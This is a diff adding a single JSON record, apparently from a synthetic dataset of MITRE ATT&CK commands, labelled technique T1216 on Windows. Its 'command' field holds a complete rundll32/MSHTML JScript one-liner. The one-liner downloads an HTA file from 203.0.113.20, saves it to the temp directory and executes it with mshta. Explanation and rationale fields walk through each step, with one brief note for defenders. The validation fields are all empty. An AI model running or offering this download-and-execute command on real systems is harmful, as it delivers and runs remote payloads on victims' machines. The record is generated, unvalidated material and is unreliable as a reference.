@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";var x=new ActiveXObject(\"MSXML2.XMLHTTP\");x.open(\"GET\",\"https://203.0.113.20/drop.hta\",false);x.send();var s=new ActiveXObject(\"ADODB.Stream\");s.Type=1;s.Open();s.Write(x.responseBody);var fso=new ActiveXObject(\"Scripting.FileSystemObject\");var f=fso.GetSpecialFolder(2)+\"\\\\drop.hta\";s.SaveToFile(f,2);new ActiveXObject(\"WScript.Shell\").Run(\"mshta \"+f)",
+  "explanation": "Invokes MSHTML via rundll32 as a script proxy to download an HTA to the temp directory and execute it with mshta, remaining within user privileges and native tooling.",
+  "rationale_steps": [
+    "Launch MSHTML RunHTMLApplication with rundll32 from PowerShell.",
+    "In JScript, use XMLHTTP and ADODB.Stream to download and save remote content to %TEMP%.",
+    "Execute the saved HTA with mshta; defenders should watch for ADODB/Stream usage inside rundll32/MSHTML contexts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-d5de4454",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
